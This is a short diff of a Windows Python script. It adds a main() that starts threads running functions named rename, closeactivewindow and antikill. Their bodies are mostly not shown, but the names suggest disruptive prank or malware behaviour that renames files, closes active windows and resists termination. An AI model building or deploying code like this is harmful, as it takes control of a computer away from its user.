@@ -2,10 +2,10 @@ import os.path
 import subprocess
 import time
 import random
-import glob
 import win32gui
 import ctypes
 import win32con
+import threading
 
 
 def rename():
@@ -61,8 +61,17 @@ def antikill():
                 continue
             time.sleep(2)
 
+def main():
+    renamethread = threading.Thread(target=rename)
+    closeactivewindowthread = threading.Thread(target=closeactivewindow)
+    antikillthread = threading.Thread(target=antikill)
 
+    renamethread.start()
+    closeactivewindowthread.start()
+    antikillthread.start()
 
+if __name__ == '__main__':
+    main()
 
 
 
